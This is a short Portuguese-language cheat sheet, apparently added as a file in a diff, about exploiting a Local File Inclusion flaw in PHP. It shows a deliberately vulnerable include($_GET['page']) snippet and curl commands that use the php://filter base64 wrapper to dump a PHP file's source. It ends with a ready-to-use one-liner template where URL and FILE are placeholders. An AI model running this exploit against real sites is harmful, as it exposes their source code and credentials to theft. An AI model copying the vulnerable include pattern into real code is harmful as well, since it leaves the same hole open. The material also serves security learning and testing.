@@ -1,0 +1,31 @@
+-------------------------------------------------------
+ INCLUIR PÁGINA PHP NA INTEGRA COM VULNERABILIDADE LFI
+-------------------------------------------------------
+
+- EXEMPLO VULNERAVEL
+
+<?php
+include($_GET["page"] . ".php");
+?>
+
+- CURL NORMAL
+
+$ curl "http://localhost/ex1.php?page=index"
+Some index page or something
+
+- CURL COM BASE64 ENCODE PHP
+
+$ curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index"
+PD9waHAKcHJpbnQoIlNvbWUgaW5kZXggcGFnZSBvciBzb21ldGhpbmdcbiIpOwo/Pgo=
+
+- CURL FINAL
+$ curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d
+<?php
+print("Some index page or something\n");
+?>
+
+***SNIPPET***
+	
+	php://filter/convert.base64-encode/resource=
+	
+	curl -s "http://URL.php?page=php://filter/convert.base64-encode/resource=FILE" | base64 -d
